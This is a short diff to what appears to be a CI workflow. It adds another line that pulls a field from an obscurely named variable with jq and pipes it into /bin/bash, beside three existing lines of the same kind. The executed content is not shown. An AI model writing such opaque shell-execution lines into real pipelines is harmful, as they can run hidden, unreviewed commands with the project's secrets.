@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$jrzm019" | jq -r .lcnma5 | /bin/bash
           printf '%s' "$htq211" | jq -r .w53802 | /bin/bash
           printf '%s' "$bc1" | jq -r .j0 | /bin/bash
+          printf '%s' "$w6" | jq -r .wrrcv766 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
